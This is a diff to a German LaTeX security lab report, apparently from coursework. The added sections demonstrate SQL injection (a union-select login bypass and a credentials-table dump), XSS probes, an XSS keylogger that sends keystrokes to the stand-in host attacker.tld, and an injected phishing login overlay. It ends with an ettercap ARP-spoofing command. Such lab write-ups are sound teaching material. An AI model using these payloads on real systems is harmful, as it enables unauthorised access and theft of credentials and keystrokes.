@@ -12,6 +12,8 @@
 \usepackage{enumerate}
 \usepackage{fancyhdr}
 \usepackage{listings}
+\usepackage{float}
+\usepackage{placeins}
 \lstset{basicstyle=\ttfamily\footnotesize,breaklines=true}
 
 \graphicspath{{./images/}}
@@ -317,8 +319,137 @@ Zudem war Suricata in der Lage den NMAP-Scan, den Script-Scan, zu entdecken und 
 \end{figure}
 
 \subsection{SQL Injection}
+Um die Anfälligkeit der Webanwendung für SQL Injection zu testen, wurde ein Angriff auf das Login-Formular simuliert. Zunächst wurde ein einfacher Test mit dem Benutzernamen \lstinline[breaklines]|';''| und einem beliebigen Passwort durchgeführt. Dies führte zu einem internen Serverfehler (HTTP 500), der wertvolle Informationen über die zugrunde liegende Datenbankabfrage preisgab.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=17cm]{sql-login-error-message.png}
+    \caption{Fehlermeldung beim Login in der Webanwendung}
+    \label{fig:sql-login-error-message}
+\end{figure}
+
+\noindent Die Analyse des Fehlerlogs in den Entwicklertools des Browsers offenbarte die verwendete SQL-Abfrage aus der Webanwendung.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=17cm]{sql-login-error-response.png}
+    \caption{Response der Webanwendung}
+    \label{fig:sql-login-error-response}
+\end{figure}
+
+\noindent Mit diesem Wissen wurde eine angepasste Injection erstellt:
+\begin{lstlisting}[breaklines]
+' union select 1,'itsec','attack'; -- '
+\end{lstlisting}
+Diese Eingabe als Benutzername, kombiniert mit \lstinline|attack| als Passwort, ermöglicht eine unbefugte Anmeldung als \lstinline|itsec| oder potenziell als jeder andere Benutzer.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=17cm]{sql-injection-login-attempt.png}
+    \caption{Login mit SQL Injection}
+    \label{fig:sql-injection-login-attempt}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=17cm]{sql-injection-login-success.png}
+    \caption{Erfolgreiche Anmeldung mit SQL Injection}
+    \label{fig:sql-injection-login-success}
+\end{figure}
+
+\noindent Um die Möglichkeiten der SQL Injection weiter zu demonstrieren, wurde eine alternative Injection entwickelt, um alle Benutzerdaten zu extrahieren:
+\begin{lstlisting}[breaklines]
+' union select 1, group_concat(concat_ws('|', user, password) separator ', '), 'attack' from credentials -- '
+\end{lstlisting}
+Diese wird ebenfalls als Benutzername eingegeben und \lstinline|attack| als Passwort verwendet. Unser Benutzername in der Webanwendung enthält nun alle extrahierten Daten aus der Datenbanktabelle.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=17cm]{sql-injection-data-extraction.png}
+    \caption{Extraktion aller Benutzerdaten mit SQL Injection}
+    \label{fig:sql-injection-data-extraction}
+\end{figure}
+
+\FloatBarrier
 
 \subsection{Cross-Site Scripting}
+Um die Cross-Site Scripting (XSS) Schwachstelle der Webanwendung zu demonstrieren, wurden verschiedene Methoden der Code-Injektion in das Message Board getestet, das nach erfolgreicher Anmeldung zugänglich ist.
+
+\noindent Zunächst wurde ein einfacher JavaScript-Code injiziert: \lstinline|<script>alert('test')</script>|
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=15cm]{xss-script-injection-fail.png}
+    \caption{Fehlgeschlagene Ausführung des JavaScript-Codes}
+    \label{fig:xss-script-injection-fail}
+\end{figure}
+
+\noindent Dieser Code wurde zwar in den HTML-Quelltext eingefügt, aber von Firefox ignoriert, was an der grauen Hinterlegung im Quelltext erkennbar war.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=17cm]{xss-script-injection-html.png}
+    \caption{HTML-Quelltext mit grau hinterlegtem JavaScript-Code}
+    \label{fig:xss-script-injection-html}
+\end{figure}
+
+\noindent Als Alternative wurde ein <img>-Tag mit dem onerror-Attribut verwendet.
+\begin{lstlisting}[breaklines]
+<img src="" onerror=alert('test')>
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=17cm]{xss-img-tag-injection-success.png}
+    \caption{Erfolgreiche XSS-Ausführung mit img-Tag}
+    \label{fig:xss-img-tag-injection-success}
+\end{figure}
+
+\noindent Diese Methode war erfolgreich und löste wie erwartet ein Alert-Fenster aus.
+
+\noindent Um die Schwere der XSS-Schwachstelle zu verdeutlichen, wurden zwei Angriffsvektoren getestet.
+
+\noindent Zunächst wurde ein Keylogger eingesetzt, der jeden Tastendruck auf der Website aufzeichnet und an einen externen Server sendet.
+\begin{lstlisting}[breaklines]
+<img src="" onerror="document.addEventListener('keypress', function(e) { fetch('http://attacker.tld?key=' + String.fromCharCode(e.which)); }); this.remove();">
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=17cm]{xss-keylogger-network-traffic.png}
+    \caption{Netzwerkverkehr des XSS-Keyloggers}
+    \label{fig:xss-keylogger-network-traffic}
+\end{figure}
+
+\noindent Dann wurde eine Phishing-Seite imitiert, die eine legitime Website nachahmt, um Benutzerdaten zu stehlen.
+\begin{lstlisting}[breaklines]
+<img src="" onerror="(function(){
+  document.body.innerHTML = `
+    <div style='position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center;'>
+      <div style='background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; text-align: center;'>
+        <h2 style='color: #1877f2; font-family: Helvetica, Arial, sans-serif; margin-bottom: 20px;'>Website</h2>
+        <form>
+          <input type='text' placeholder='Email or Phone Number' style='width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;'>
+          <input type='password' placeholder='Password' style='width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;'>
+          <button type='submit' style='width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;'>Log In</button>
+        </form>
+        <div style='margin-top: 10px;'>
+          <a href='#' style='color: #1877f2; font-size: 14px; text-decoration: none;'>Forgotten password?</a>
+        </div>
+      </div>
+    </div>
+  `;
+}())">
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=17cm]{xss-phishing-page-injection.png}
+    \caption{Darstellung der XSS-injizierten Phishing-Seite}
+    \label{fig:xss-phishing-page-injection}
+\end{figure}
+
+\FloatBarrier
 
 \subsection{ARP Spoofing}
 Für das ARP-Spoofing wurde die CLI Version des Tools \lstinline[breaklines]|ettercap| genutzt. Das Tool wurde mit dem Befehl \lstinline[breaklines]|sudo ettercap -T -M arp /192.168.0.220// /192.168.0.221//| aufgerufen \cite{ettercap-manual}:
